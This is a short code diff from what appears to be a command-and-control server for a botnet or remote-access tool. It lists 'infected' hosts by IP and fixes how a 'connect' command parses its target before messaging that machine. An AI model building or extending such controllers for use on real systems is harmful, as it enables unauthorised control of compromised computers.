@@ -47,7 +47,7 @@ def server():
                             for infected in dict_ip:
                                 print(f"{infected}: {dict_ip[infected]}")
                         case "connect":
-                            target = order.strip().split(" ")[2]
+                            target = order.strip().split(" ")[1]
                             send_message(target + " echo i'm connected", dict_ip)
                     
                     
